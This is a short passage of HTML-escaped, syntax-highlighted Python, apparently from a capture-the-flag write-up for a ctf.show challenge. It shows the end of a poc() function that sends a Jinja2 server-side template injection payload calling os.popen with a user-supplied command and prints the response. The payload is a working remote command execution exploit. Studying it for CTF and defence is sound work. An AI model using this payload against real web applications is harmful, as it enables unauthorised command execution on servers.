&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://059cc139-d7d5-4369-86b1-0f3cf98b114c.challenge.ctf.show/?name=&amp;#123;&amp;#123;config.__class__.__init__.__globals__[&amp;#x27;os&amp;#x27;].popen(&amp;#x27;&amp;quot;&lt;/span&gt; + cmd + &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27;).read() &amp;#125;&amp;#125;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            anser = get(url).text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(anser)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;poc()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
